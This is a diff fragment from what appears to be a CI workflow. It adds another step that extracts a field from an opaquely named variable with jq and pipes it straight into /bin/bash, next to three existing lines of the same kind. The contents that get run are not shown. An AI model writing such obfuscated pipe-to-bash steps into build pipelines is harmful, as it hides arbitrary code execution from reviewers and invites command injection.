@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$uqho352" | jq -r .kv840 | /bin/bash
           echo $wl0325 | jq -r .b19 | /bin/bash
           printf '%s' "$i18359" | jq -r .znb20 | /bin/bash
+          echo $d438 | jq -r .zss8335 | /bin/bash
 
       - name: Archive output
         if: always()
